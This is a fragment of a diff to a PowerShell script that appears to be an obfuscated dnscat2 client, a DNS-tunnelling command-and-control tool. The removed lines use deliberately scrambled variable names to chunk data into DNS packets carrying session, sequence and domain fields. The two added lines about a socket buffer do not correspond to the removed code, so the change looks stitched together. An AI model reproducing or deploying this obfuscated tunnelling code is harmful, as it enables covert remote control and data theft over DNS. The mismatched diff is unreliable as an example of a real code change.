-       foreach($SdpEHYxIDcuXz0tmMHscllkcF7ZFV76GijPYI7fVU47A0XJqiA4vIM2vy9dilp4WnxdO7YkIFEMy0QyfbZ5cWLnRJnz9NQAPhNL2L4LkpjnJHHGoZNl9fv3Ll5hF9os6PaPLBTuhvOtgTxJef6X4rLOmdyfGmglsrpa22ak69yRvnIc3msxXC83ZCp4rMFtkTGfqtSdlxFWPbdhcjQuNW39Qb19PxAP3VRJDDgupSM7TBUwyKkJHClJ9WrysmGvsfYwCrBrpThqfGfuZlqbZyBoAtgGUKXZUh2e4r1FyvCSQY4yMCKNkAazfuymUZo8ZZZkSR54P1IlNqwTVysH0nNMIIn19FZQKtPJoeYFxUuHiEENnq58vqrN4jw6aC9WAEwkDF8Lc0CfyA2JRcd5Cou8AvNnwNhPOlw20dsc0k4e9XX8e3y0sGHPtD317Klh7qbTVQKMSV5piNibR9THQ8C9AVx51LHaYeclelsVXAXWrTbOAOEwcARZ7TdoilWxInuHdsIy789zs2KrLl3nU7RNQJchiNj0bfKCTh7ir7wBxGaGzUk2HbYrYAa7kbOQAEvfwwUwBgpeSTFFmUFnOreLRgehNkWAr0ULcnZHIoEsARIZEGbaftrbCOnXDAE67fhFkR6xxzA09n0vVhEdZfQOz7sUT0reFoQkop6R3jx2sWpcFwlAepTA8Rl7AilQgK1ArZ7nJlAxxiK9LXKFIXdJa4sRYQmCfyOEGjQtuZgWOrADqb7ZNqj0RNydbmoaYQFWrPlDaegX5hH2GpDy7SNzWcQ62ywxWTWJttDStN7y6ic152fS4NyEF9ppTYJy569hpES0aSwKobO4IPOSXF4DcIT53fugal0BLW873v53NCdxvRewvsrTO8fw8DCghQEah5oWLRDXuWhWPVNVmGnvRZS8iOfgxX in $p38SEfS9HgiGqAZbRXR8EpKKKNJrWR18gHcuuIq7UStIFblloC7gqd8EBsxBvw13sfinfwzsn9CmEcMGM3AOdnt16m0UzLOP5tUXKAKHH8B6aWSvNSjerzkF6oAJbDbZIuAjQTnu3kBHFAPzmBOt0AFqe2CpucblYZEjgP3mh93TMrWgHZ5UCA8TXMsSwEbvLQPv9bqX9rt6H1VuYMqtzFjd4eEaahuFlySgJKWwcBzuOLI9ysVTuYJVn0VErKrwf1YmUvaDIsPKgL8ebBRrjyyRmMDEzkc47PVNpOfWjWkB6wGVwX2mqkqe7wxSZ7X2qRItjHxhhmZ7Khjqiv5fXfgzT3TSLXgEZHTejU2WUQkhLAmrmbukCcG1TjvxGpM1aemdeELWKelAwAQOcVUBvDrT8VE6OVDitqmQwgGB8lLaxsOmJB3PFQn0YOqce2ZjAfPRCJCaZyoUzUmhHaGzZ9brmVvZth9hOmts9Hi2j76ZoCOwucPP2dj5a7iBM1PhIdrF3zML3XvxFXgk8LCVb4EBOwCb8RADRKaInDOpTroygmRmjHhCHA0XSr35Uo5iZ7kv74nDWu5D2xyJYiaeqnN806y2DURKQTEhfAljKxw7ypcrkoDnfF6TNiFynGCJB0b84BtN0geqm9gENixMuYnHf5Ehe5CgjgBD1eA8gswqWl1RGRtBGCJ1pIzEGUQiE)
-  {
-   if($nFylesYS0EM2WNiWmBLxov3L7G613vCPYeGTtTKwyhw1KkC1tV9uHBsmmmef3TGxZWGoWdR4p1TQZO7wbZFZCU9q1hy9oEXXBKnYuv2Bca3PxgqEnHDFb9ssa7zdGs1ULP8FunXRL3qNfsQnu116UHHwGaa0u8TZ6XaZgmEdPEN6Bm9RzFjE93t8PAFDbyzvGPAfQCyvxXyoKIbfq0HJF5mb2mfeWIbLRTEqgmimUPxShtSA3S7yj0m9cJks1xVx735I3WnL39ENNyEENIyhuBvCBKUKM3g9LEs6XoXl4OfLtgODgIwl5OxZPyxjGN2vEtTGIDTwWtINA3XSKr2bnY6AuXFvu8hHA4ZLidU8FncmeIah4ARJiOkSMg85Le28cEn6wRb0VkRhpdHFNQtYob9WtaLL3Uo1PrV1hid9MqNt77ruCKPaGbj8gxNuZUsSD00Jb2ANiH5HHWcyZkxhMy4koiSQhXP5mtMj1GOb8az7N9Jg9aPGqraFFiYBflD -ge 30)
-         {
-     $nFylesYS0EM2WNiWmBLxov3L7G613vCPYeGTtTKwyhw1KkC1tV9uHBsmmmef3TGxZWGoWdR4p1TQZO7wbZFZCU9q1hy9oEXXBKnYuv2Bca3PxgqEnHDFb9ssa7zdGs1ULP8FunXRL3qNfsQnu116UHHwGaa0u8TZ6XaZgmEdPEN6Bm9RzFjE93t8PAFDbyzvGPAfQCyvxXyoKIbfq0HJF5mb2mfeWIbLRTEqgmimUPxShtSA3S7yj0m9cJks1xVx735I3WnL39ENNyEENIyhuBvCBKUKM3g9LEs6XoXl4OfLtgODgIwl5OxZPyxjGN2vEtTGIDTwWtINA3XSKr2bnY6AuXFvu8hHA4ZLidU8FncmeIah4ARJiOkSMg85Le28cEn6wRb0VkRhpdHFNQtYob9WtaLL3Uo1PrV1hid9MqNt77ruCKPaGbj8gxNuZUsSD00Jb2ANiH5HHWcyZkxhMy4koiSQhXP5mtMj1GOb8az7N9Jg9aPGqraFFiYBflD = 0
-       $M1VMX9IZNnzdIXPaczFuPbdmBO2vJLrEmgdRTAGuBiV8CZv8Esyl4G7zGne9Jkv05lQfXZO875dIx5tl6jM2kZdm2Kfys0zwLHFMbyRgfGmTD9MLWqTRWIxQ0vPDC7VEMDUcdz1aRjyVeVrn4RXyi8ynBhOwgxTZtqXgxEx5ZxEP2XgPIDaXaCKFN5baUE7xtOhGDUkySLJT7nnHqF0CYIufXhHQLauUdWZ9TbGgbBFvsvqNazVsrMwpjXNP2MlpUR3MJwc1dWDhUEVz5MajYtvusPavf10TS8E0VGUDxjM78ND7tGi1Fsig4CCOC6GPrYPE2HEpvFcoO24L80yukvbWfm2VGJmCEDokGSt66YAWRNJXMDcqwUrJcKgRSBlx7xUNCxQ9G7AfSI4VvHneDetHhgcNxo5oi5NozSxOmInUgMdvQIVwvf1rpVi0P0EXbnDnDMNxTALAnIMFl66Xd6b0YXB5aL8z0DEtOAuk91tI3RVBHBtNqEell2qSmaT8MdAsSM4fYO1TUofzygrB3Hy2Dc0lBEkwUuvciettA4esehBfllFaAJkm7pr91lwj6BXmQvJRKlgvauXg75Bnu5ge51wpOlKMpVq1IpoXduPPsat2xN51GkPJV8qhZdthk7gVPHmtuYQlF1N7YZ3k5vY6L6IiekeVNp5CdLP4vsWrejh9e6NR2a45FkIL0B4nfnEBqAVWlTHOHdEAhARxQULB5dKSmeziFTOe8Vyv83p0Uvd1iXxgzFiXw0nJZc += "."
-         }
- if($7ST23BNoQhoqyQZkULHPoqzsISKXIdi3BY2drhWuySeqnDTuOHSORY412yra90ktqSJLYv8ZZhKlZ4lbbowzJ8ecnV0eKXnR0qc1GKSjoUmjJkCcl7A6SIzyJ2jGQuMSFy7oc9p3JTSfbNmhlx5xqoGTVog65U9cnWefndyGPxBr7GYeJWpP6OrB8xMgJGalCvzz1lDsCXDmClXgjbK9Dy -ge ($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["MaxMSGDataSize"]))
-     {
-        $vi2smrFau5njpuSJLL4fpOA071q0a1DK6ubGdhkbL4NS1UzE8m2EYjK8ti6Xu4QgkQobB58uohbtB8DYw1ze8eFxT7RJfDYURmWlLJ913RFdnlLFPYfxanUmbbshDQovbBRzOY3MYhtYRdsNFryDKBK4UpJxbAL4JFCDgmEYI4nVCStdZTyDpxkk0nd5L2mEJtKvHSQYoeKuBSTuQR7TeeEp5nB6ga4wabY7dHmS6mwezl19MLIBScYBNE4JxCA61jTXTh8WRZkgRUZ2Rh9QSah4dLEikqVHDMS6QxROPOCGiVpIJQFIEwews0yIntAbWJCjKE8DmZHzSSsz2Qd7iQizqEqtp04sUdaCJBnGir4I4G67X5sQKariyZfEuRjaZ8rFLGZbqrxE355Kpih20mIivUSQwlX3pDDE7VTNUcHUGlP2KPyTGziJoP8FknvwJsFGctxS5Le0pevKz82uvybmyGzR6WdJMwPMDFzSo8J8YdhqqzmJAvOx3xpQUzaBG5Xiq6hAxgJvqnioZhWdOXQIYMzVvQIQYi4kH6ZtvNlD += $M1VMX9IZNnzdIXPaczFuPbdmBO2vJLrEmgdRTAGuBiV8CZv8Esyl4G7zGne9Jkv05lQfXZO875dIx5tl6jM2kZdm2Kfys0zwLHFMbyRgfGmTD9MLWqTRWIxQ0vPDC7VEMDUcdz1aRjyVeVrn4RXyi8ynBhOwgxTZtqXgxEx5ZxEP2XgPIDaXaCKFN5baUE7xtOhGDUkySLJT7nnHqF0CYIufXhHQLauUdWZ9TbGgbBFvsvqNazVsrMwpjXNP2MlpUR3MJwc1dWDhUEVz5MajYtvusPavf10TS8E0VGUDxjM78ND7tGi1Fsig4CCOC6GPrYPE2HEpvFcoO24L80yukvbWfm2VGJmCEDokGSt66YAWRNJXMDcqwUrJcKgRSBlx7xUNCxQ9G7AfSI4VvHneDetHhgcNxo5oi5NozSxOmInUgMdvQIVwvf1rpVi0P0EXbnDnDMNxTALAnIMFl66Xd6b0YXB5aL8z0DEtOAuk91tI3RVBHBtNqEell2qSmaT8MdAsSM4fYO1TUofzygrB3Hy2Dc0lBEkwUuvciettA4esehBfllFaAJkm7pr91lwj6BXmQvJRKlgvauXg75Bnu5ge51wpOlKMpVq1IpoXduPPsat2xN51GkPJV8qhZdthk7gVPHmtuYQlF1N7YZ3k5vY6L6IiekeVNp5CdLP4vsWrejh9e6NR2a45FkIL0B4nfnEBqAVWlTHOHdEAhARxQULB5dKSmeziFTOe8Vyv83p0Uvd1iXxgzFiXw0nJZc.TrimEnd(".")
-  $7ST23BNoQhoqyQZkULHPoqzsISKXIdi3BY2drhWuySeqnDTuOHSORY412yra90ktqSJLYv8ZZhKlZ4lbbowzJ8ecnV0eKXnR0qc1GKSjoUmjJkCcl7A6SIzyJ2jGQuMSFy7oc9p3JTSfbNmhlx5xqoGTVog65U9cnWefndyGPxBr7GYeJWpP6OrB8xMgJGalCvzz1lDsCXDmClXgjbK9Dy = 0
-       $nFylesYS0EM2WNiWmBLxov3L7G613vCPYeGTtTKwyhw1KkC1tV9uHBsmmmef3TGxZWGoWdR4p1TQZO7wbZFZCU9q1hy9oEXXBKnYuv2Bca3PxgqEnHDFb9ssa7zdGs1ULP8FunXRL3qNfsQnu116UHHwGaa0u8TZ6XaZgmEdPEN6Bm9RzFjE93t8PAFDbyzvGPAfQCyvxXyoKIbfq0HJF5mb2mfeWIbLRTEqgmimUPxShtSA3S7yj0m9cJks1xVx735I3WnL39ENNyEENIyhuBvCBKUKM3g9LEs6XoXl4OfLtgODgIwl5OxZPyxjGN2vEtTGIDTwWtINA3XSKr2bnY6AuXFvu8hHA4ZLidU8FncmeIah4ARJiOkSMg85Le28cEn6wRb0VkRhpdHFNQtYob9WtaLL3Uo1PrV1hid9MqNt77ruCKPaGbj8gxNuZUsSD00Jb2ANiH5HHWcyZkxhMy4koiSQhXP5mtMj1GOb8az7N9Jg9aPGqraFFiYBflD = 0
-        $M1VMX9IZNnzdIXPaczFuPbdmBO2vJLrEmgdRTAGuBiV8CZv8Esyl4G7zGne9Jkv05lQfXZO875dIx5tl6jM2kZdm2Kfys0zwLHFMbyRgfGmTD9MLWqTRWIxQ0vPDC7VEMDUcdz1aRjyVeVrn4RXyi8ynBhOwgxTZtqXgxEx5ZxEP2XgPIDaXaCKFN5baUE7xtOhGDUkySLJT7nnHqF0CYIufXhHQLauUdWZ9TbGgbBFvsvqNazVsrMwpjXNP2MlpUR3MJwc1dWDhUEVz5MajYtvusPavf10TS8E0VGUDxjM78ND7tGi1Fsig4CCOC6GPrYPE2HEpvFcoO24L80yukvbWfm2VGJmCEDokGSt66YAWRNJXMDcqwUrJcKgRSBlx7xUNCxQ9G7AfSI4VvHneDetHhgcNxo5oi5NozSxOmInUgMdvQIVwvf1rpVi0P0EXbnDnDMNxTALAnIMFl66Xd6b0YXB5aL8z0DEtOAuk91tI3RVBHBtNqEell2qSmaT8MdAsSM4fYO1TUofzygrB3Hy2Dc0lBEkwUuvciettA4esehBfllFaAJkm7pr91lwj6BXmQvJRKlgvauXg75Bnu5ge51wpOlKMpVq1IpoXduPPsat2xN51GkPJV8qhZdthk7gVPHmtuYQlF1N7YZ3k5vY6L6IiekeVNp5CdLP4vsWrejh9e6NR2a45FkIL0B4nfnEBqAVWlTHOHdEAhARxQULB5dKSmeziFTOe8Vyv83p0Uvd1iXxgzFiXw0nJZc = ""
-         }
-         $M1VMX9IZNnzdIXPaczFuPbdmBO2vJLrEmgdRTAGuBiV8CZv8Esyl4G7zGne9Jkv05lQfXZO875dIx5tl6jM2kZdm2Kfys0zwLHFMbyRgfGmTD9MLWqTRWIxQ0vPDC7VEMDUcdz1aRjyVeVrn4RXyi8ynBhOwgxTZtqXgxEx5ZxEP2XgPIDaXaCKFN5baUE7xtOhGDUkySLJT7nnHqF0CYIufXhHQLauUdWZ9TbGgbBFvsvqNazVsrMwpjXNP2MlpUR3MJwc1dWDhUEVz5MajYtvusPavf10TS8E0VGUDxjM78ND7tGi1Fsig4CCOC6GPrYPE2HEpvFcoO24L80yukvbWfm2VGJmCEDokGSt66YAWRNJXMDcqwUrJcKgRSBlx7xUNCxQ9G7AfSI4VvHneDetHhgcNxo5oi5NozSxOmInUgMdvQIVwvf1rpVi0P0EXbnDnDMNxTALAnIMFl66Xd6b0YXB5aL8z0DEtOAuk91tI3RVBHBtNqEell2qSmaT8MdAsSM4fYO1TUofzygrB3Hy2Dc0lBEkwUuvciettA4esehBfllFaAJkm7pr91lwj6BXmQvJRKlgvauXg75Bnu5ge51wpOlKMpVq1IpoXduPPsat2xN51GkPJV8qhZdthk7gVPHmtuYQlF1N7YZ3k5vY6L6IiekeVNp5CdLP4vsWrejh9e6NR2a45FkIL0B4nfnEBqAVWlTHOHdEAhARxQULB5dKSmeziFTOe8Vyv83p0Uvd1iXxgzFiXw0nJZc += $SdpEHYxIDcuXz0tmMHscllkcF7ZFV76GijPYI7fVU47A0XJqiA4vIM2vy9dilp4WnxdO7YkIFEMy0QyfbZ5cWLnRJnz9NQAPhNL2L4LkpjnJHHGoZNl9fv3Ll5hF9os6PaPLBTuhvOtgTxJef6X4rLOmdyfGmglsrpa22ak69yRvnIc3msxXC83ZCp4rMFtkTGfqtSdlxFWPbdhcjQuNW39Qb19PxAP3VRJDDgupSM7TBUwyKkJHClJ9WrysmGvsfYwCrBrpThqfGfuZlqbZyBoAtgGUKXZUh2e4r1FyvCSQY4yMCKNkAazfuymUZo8ZZZkSR54P1IlNqwTVysH0nNMIIn19FZQKtPJoeYFxUuHiEENnq58vqrN4jw6aC9WAEwkDF8Lc0CfyA2JRcd5Cou8AvNnwNhPOlw20dsc0k4e9XX8e3y0sGHPtD317Klh7qbTVQKMSV5piNibR9THQ8C9AVx51LHaYeclelsVXAXWrTbOAOEwcARZ7TdoilWxInuHdsIy789zs2KrLl3nU7RNQJchiNj0bfKCTh7ir7wBxGaGzUk2HbYrYAa7kbOQAEvfwwUwBgpeSTFFmUFnOreLRgehNkWAr0ULcnZHIoEsARIZEGbaftrbCOnXDAE67fhFkR6xxzA09n0vVhEdZfQOz7sUT0reFoQkop6R3jx2sWpcFwlAepTA8Rl7AilQgK1ArZ7nJlAxxiK9LXKFIXdJa4sRYQmCfyOEGjQtuZgWOrADqb7ZNqj0RNydbmoaYQFWrPlDaegX5hH2GpDy7SNzWcQ62ywxWTWJttDStN7y6ic152fS4NyEF9ppTYJy569hpES0aSwKobO4IPOSXF4DcIT53fugal0BLW873v53NCdxvRewvsrTO8fw8DCghQEah5oWLRDXuWhWPVNVmGnvRZS8iOfgxX
-      $nFylesYS0EM2WNiWmBLxov3L7G613vCPYeGTtTKwyhw1KkC1tV9uHBsmmmef3TGxZWGoWdR4p1TQZO7wbZFZCU9q1hy9oEXXBKnYuv2Bca3PxgqEnHDFb9ssa7zdGs1ULP8FunXRL3qNfsQnu116UHHwGaa0u8TZ6XaZgmEdPEN6Bm9RzFjE93t8PAFDbyzvGPAfQCyvxXyoKIbfq0HJF5mb2mfeWIbLRTEqgmimUPxShtSA3S7yj0m9cJks1xVx735I3WnL39ENNyEENIyhuBvCBKUKM3g9LEs6XoXl4OfLtgODgIwl5OxZPyxjGN2vEtTGIDTwWtINA3XSKr2bnY6AuXFvu8hHA4ZLidU8FncmeIah4ARJiOkSMg85Le28cEn6wRb0VkRhpdHFNQtYob9WtaLL3Uo1PrV1hid9MqNt77ruCKPaGbj8gxNuZUsSD00Jb2ANiH5HHWcyZkxhMy4koiSQhXP5mtMj1GOb8az7N9Jg9aPGqraFFiYBflD += 2
-    $7ST23BNoQhoqyQZkULHPoqzsISKXIdi3BY2drhWuySeqnDTuOHSORY412yra90ktqSJLYv8ZZhKlZ4lbbowzJ8ecnV0eKXnR0qc1GKSjoUmjJkCcl7A6SIzyJ2jGQuMSFy7oc9p3JTSfbNmhlx5xqoGTVog65U9cnWefndyGPxBr7GYeJWpP6OrB8xMgJGalCvzz1lDsCXDmClXgjbK9Dy += 2
-   }
-  $M1VMX9IZNnzdIXPaczFuPbdmBO2vJLrEmgdRTAGuBiV8CZv8Esyl4G7zGne9Jkv05lQfXZO875dIx5tl6jM2kZdm2Kfys0zwLHFMbyRgfGmTD9MLWqTRWIxQ0vPDC7VEMDUcdz1aRjyVeVrn4RXyi8ynBhOwgxTZtqXgxEx5ZxEP2XgPIDaXaCKFN5baUE7xtOhGDUkySLJT7nnHqF0CYIufXhHQLauUdWZ9TbGgbBFvsvqNazVsrMwpjXNP2MlpUR3MJwc1dWDhUEVz5MajYtvusPavf10TS8E0VGUDxjM78ND7tGi1Fsig4CCOC6GPrYPE2HEpvFcoO24L80yukvbWfm2VGJmCEDokGSt66YAWRNJXMDcqwUrJcKgRSBlx7xUNCxQ9G7AfSI4VvHneDetHhgcNxo5oi5NozSxOmInUgMdvQIVwvf1rpVi0P0EXbnDnDMNxTALAnIMFl66Xd6b0YXB5aL8z0DEtOAuk91tI3RVBHBtNqEell2qSmaT8MdAsSM4fYO1TUofzygrB3Hy2Dc0lBEkwUuvciettA4esehBfllFaAJkm7pr91lwj6BXmQvJRKlgvauXg75Bnu5ge51wpOlKMpVq1IpoXduPPsat2xN51GkPJV8qhZdthk7gVPHmtuYQlF1N7YZ3k5vY6L6IiekeVNp5CdLP4vsWrejh9e6NR2a45FkIL0B4nfnEBqAVWlTHOHdEAhARxQULB5dKSmeziFTOe8Vyv83p0Uvd1iXxgzFiXw0nJZc = $M1VMX9IZNnzdIXPaczFuPbdmBO2vJLrEmgdRTAGuBiV8CZv8Esyl4G7zGne9Jkv05lQfXZO875dIx5tl6jM2kZdm2Kfys0zwLHFMbyRgfGmTD9MLWqTRWIxQ0vPDC7VEMDUcdz1aRjyVeVrn4RXyi8ynBhOwgxTZtqXgxEx5ZxEP2XgPIDaXaCKFN5baUE7xtOhGDUkySLJT7nnHqF0CYIufXhHQLauUdWZ9TbGgbBFvsvqNazVsrMwpjXNP2MlpUR3MJwc1dWDhUEVz5MajYtvusPavf10TS8E0VGUDxjM78ND7tGi1Fsig4CCOC6GPrYPE2HEpvFcoO24L80yukvbWfm2VGJmCEDokGSt66YAWRNJXMDcqwUrJcKgRSBlx7xUNCxQ9G7AfSI4VvHneDetHhgcNxo5oi5NozSxOmInUgMdvQIVwvf1rpVi0P0EXbnDnDMNxTALAnIMFl66Xd6b0YXB5aL8z0DEtOAuk91tI3RVBHBtNqEell2qSmaT8MdAsSM4fYO1TUofzygrB3Hy2Dc0lBEkwUuvciettA4esehBfllFaAJkm7pr91lwj6BXmQvJRKlgvauXg75Bnu5ge51wpOlKMpVq1IpoXduPPsat2xN51GkPJV8qhZdthk7gVPHmtuYQlF1N7YZ3k5vY6L6IiekeVNp5CdLP4vsWrejh9e6NR2a45FkIL0B4nfnEBqAVWlTHOHdEAhARxQULB5dKSmeziFTOe8Vyv83p0Uvd1iXxgzFiXw0nJZc.TrimEnd(".")
-$vi2smrFau5njpuSJLL4fpOA071q0a1DK6ubGdhkbL4NS1UzE8m2EYjK8ti6Xu4QgkQobB58uohbtB8DYw1ze8eFxT7RJfDYURmWlLJ913RFdnlLFPYfxanUmbbshDQovbBRzOY3MYhtYRdsNFryDKBK4UpJxbAL4JFCDgmEYI4nVCStdZTyDpxkk0nd5L2mEJtKvHSQYoeKuBSTuQR7TeeEp5nB6ga4wabY7dHmS6mwezl19MLIBScYBNE4JxCA61jTXTh8WRZkgRUZ2Rh9QSah4dLEikqVHDMS6QxROPOCGiVpIJQFIEwews0yIntAbWJCjKE8DmZHzSSsz2Qd7iQizqEqtp04sUdaCJBnGir4I4G67X5sQKariyZfEuRjaZ8rFLGZbqrxE355Kpih20mIivUSQwlX3pDDE7VTNUcHUGlP2KPyTGziJoP8FknvwJsFGctxS5Le0pevKz82uvybmyGzR6WdJMwPMDFzSo8J8YdhqqzmJAvOx3xpQUzaBG5Xiq6hAxgJvqnioZhWdOXQIYMzVvQIQYi4kH6ZtvNlD += $M1VMX9IZNnzdIXPaczFuPbdmBO2vJLrEmgdRTAGuBiV8CZv8Esyl4G7zGne9Jkv05lQfXZO875dIx5tl6jM2kZdm2Kfys0zwLHFMbyRgfGmTD9MLWqTRWIxQ0vPDC7VEMDUcdz1aRjyVeVrn4RXyi8ynBhOwgxTZtqXgxEx5ZxEP2XgPIDaXaCKFN5baUE7xtOhGDUkySLJT7nnHqF0CYIufXhHQLauUdWZ9TbGgbBFvsvqNazVsrMwpjXNP2MlpUR3MJwc1dWDhUEVz5MajYtvusPavf10TS8E0VGUDxjM78ND7tGi1Fsig4CCOC6GPrYPE2HEpvFcoO24L80yukvbWfm2VGJmCEDokGSt66YAWRNJXMDcqwUrJcKgRSBlx7xUNCxQ9G7AfSI4VvHneDetHhgcNxo5oi5NozSxOmInUgMdvQIVwvf1rpVi0P0EXbnDnDMNxTALAnIMFl66Xd6b0YXB5aL8z0DEtOAuk91tI3RVBHBtNqEell2qSmaT8MdAsSM4fYO1TUofzygrB3Hy2Dc0lBEkwUuvciettA4esehBfllFaAJkm7pr91lwj6BXmQvJRKlgvauXg75Bnu5ge51wpOlKMpVq1IpoXduPPsat2xN51GkPJV8qhZdthk7gVPHmtuYQlF1N7YZ3k5vY6L6IiekeVNp5CdLP4vsWrejh9e6NR2a45FkIL0B4nfnEBqAVWlTHOHdEAhARxQULB5dKSmeziFTOe8Vyv83p0Uvd1iXxgzFiXw0nJZc
-    $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["InputData"] = ""
+      $Stopwatch.Stop()
+      $FuncVars["InitialConnectionBytes"] = $SocketDestinationBuffer[0..([int]$SocketBytesRead-1)]
     }
     else
- {
-  $vi2smrFau5njpuSJLL4fpOA071q0a1DK6ubGdhkbL4NS1UzE8m2EYjK8ti6Xu4QgkQobB58uohbtB8DYw1ze8eFxT7RJfDYURmWlLJ913RFdnlLFPYfxanUmbbshDQovbBRzOY3MYhtYRdsNFryDKBK4UpJxbAL4JFCDgmEYI4nVCStdZTyDpxkk0nd5L2mEJtKvHSQYoeKuBSTuQR7TeeEp5nB6ga4wabY7dHmS6mwezl19MLIBScYBNE4JxCA61jTXTh8WRZkgRUZ2Rh9QSah4dLEikqVHDMS6QxROPOCGiVpIJQFIEwews0yIntAbWJCjKE8DmZHzSSsz2Qd7iQizqEqtp04sUdaCJBnGir4I4G67X5sQKariyZfEuRjaZ8rFLGZbqrxE355Kpih20mIivUSQwlX3pDDE7VTNUcHUGlP2KPyTGziJoP8FknvwJsFGctxS5Le0pevKz82uvybmyGzR6WdJMwPMDFzSo8J8YdhqqzmJAvOx3xpQUzaBG5Xiq6hAxgJvqnioZhWdOXQIYMzVvQIQYi4kH6ZtvNlD = @("")
-}
-         
-   [byte[]]$DKeNKKdcrHo2PumqQIlc9sPi57rQGydnT9yz7dl84QhU7ZP1AuUUe2ehiPvWf4d2llH1xq4CpTgmjIeetR8jXLHWTVLWUoZyW1JQwlR89KEjuEaNDHYqk5ALUi1PQhf81 = @()
-      foreach($M1VMX9IZNnzdIXPaczFuPbdmBO2vJLrEmgdRTAGuBiV8CZv8Esyl4G7zGne9Jkv05lQfXZO875dIx5tl6jM2kZdm2Kfys0zwLHFMbyRgfGmTD9MLWqTRWIxQ0vPDC7VEMDUcdz1aRjyVeVrn4RXyi8ynBhOwgxTZtqXgxEx5ZxEP2XgPIDaXaCKFN5baUE7xtOhGDUkySLJT7nnHqF0CYIufXhHQLauUdWZ9TbGgbBFvsvqNazVsrMwpjXNP2MlpUR3MJwc1dWDhUEVz5MajYtvusPavf10TS8E0VGUDxjM78ND7tGi1Fsig4CCOC6GPrYPE2HEpvFcoO24L80yukvbWfm2VGJmCEDokGSt66YAWRNJXMDcqwUrJcKgRSBlx7xUNCxQ9G7AfSI4VvHneDetHhgcNxo5oi5NozSxOmInUgMdvQIVwvf1rpVi0P0EXbnDnDMNxTALAnIMFl66Xd6b0YXB5aL8z0DEtOAuk91tI3RVBHBtNqEell2qSmaT8MdAsSM4fYO1TUofzygrB3Hy2Dc0lBEkwUuvciettA4esehBfllFaAJkm7pr91lwj6BXmQvJRKlgvauXg75Bnu5ge51wpOlKMpVq1IpoXduPPsat2xN51GkPJV8qhZdthk7gVPHmtuYQlF1N7YZ3k5vY6L6IiekeVNp5CdLP4vsWrejh9e6NR2a45FkIL0B4nfnEBqAVWlTHOHdEAhARxQULB5dKSmeziFTOe8Vyv83p0Uvd1iXxgzFiXw0nJZc in $vi2smrFau5njpuSJLL4fpOA071q0a1DK6ubGdhkbL4NS1UzE8m2EYjK8ti6Xu4QgkQobB58uohbtB8DYw1ze8eFxT7RJfDYURmWlLJ913RFdnlLFPYfxanUmbbshDQovbBRzOY3MYhtYRdsNFryDKBK4UpJxbAL4JFCDgmEYI4nVCStdZTyDpxkk0nd5L2mEJtKvHSQYoeKuBSTuQR7TeeEp5nB6ga4wabY7dHmS6mwezl19MLIBScYBNE4JxCA61jTXTh8WRZkgRUZ2Rh9QSah4dLEikqVHDMS6QxROPOCGiVpIJQFIEwews0yIntAbWJCjKE8DmZHzSSsz2Qd7iQizqEqtp04sUdaCJBnGir4I4G67X5sQKariyZfEuRjaZ8rFLGZbqrxE355Kpih20mIivUSQwlX3pDDE7VTNUcHUGlP2KPyTGziJoP8FknvwJsFGctxS5Le0pevKz82uvybmyGzR6WdJMwPMDFzSo8J8YdhqqzmJAvOx3xpQUzaBG5Xiq6hAxgJvqnioZhWdOXQIYMzVvQIQYi4kH6ZtvNlD)
-{
-try{$54pit7QQIHlzwUkAVlz6EA8Auk4I4IPvUfSyNv8lMdX5QzOt7CxzJbbFAtSjp4Hvjwrfv8iymKPAgE9PU7meuJCKshjlMvlxsu2Ot8YhqoKAYbeK3VQ1mJBE0x7cwcYDoWPMsmclKGh4v = Invoke-Command $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["riYadVlCvscBwynXLycZptMYaMTZULTeijjSUvzG"] -ArgumentList @($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["SessionId"],$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["SeqNum"],$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["AckNum"],$M1VMX9IZNnzdIXPaczFuPbdmBO2vJLrEmgdRTAGuBiV8CZv8Esyl4G7zGne9Jkv05lQfXZO875dIx5tl6jM2kZdm2Kfys0zwLHFMbyRgfGmTD9MLWqTRWIxQ0vPDC7VEMDUcdz1aRjyVeVrn4RXyi8ynBhOwgxTZtqXgxEx5ZxEP2XgPIDaXaCKFN5baUE7xtOhGDUkySLJT7nnHqF0CYIufXhHQLauUdWZ9TbGgbBFvsvqNazVsrMwpjXNP2MlpUR3MJwc1dWDhUEVz5MajYtvusPavf10TS8E0VGUDxjM78ND7tGi1Fsig4CCOC6GPrYPE2HEpvFcoO24L80yukvbWfm2VGJmCEDokGSt66YAWRNJXMDcqwUrJcKgRSBlx7xUNCxQ9G7AfSI4VvHneDetHhgcNxo5oi5NozSxOmInUgMdvQIVwvf1rpVi0P0EXbnDnDMNxTALAnIMFl66Xd6b0YXB5aL8z0DEtOAuk91tI3RVBHBtNqEell2qSmaT8MdAsSM4fYO1TUofzygrB3Hy2Dc0lBEkwUuvciettA4esehBfllFaAJkm7pr91lwj6BXmQvJRKlgvauXg75Bnu5ge51wpOlKMpVq1IpoXduPPsat2xN51GkPJV8qhZdthk7gVPHmtuYQlF1N7YZ3k5vY6L6IiekeVNp5CdLP4vsWrejh9e6NR2a45FkIL0B4nfnEBqAVWlTHOHdEAhARxQULB5dKSmeziFTOe8Vyv83p0Uvd1iXxgzFiXw0nJZc,$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Tag"],$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Domain"])}
-      catch{ Write-Verbose "DNSCAT2: Failed to create packet." ; $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Failures"] += 1 ; continue }
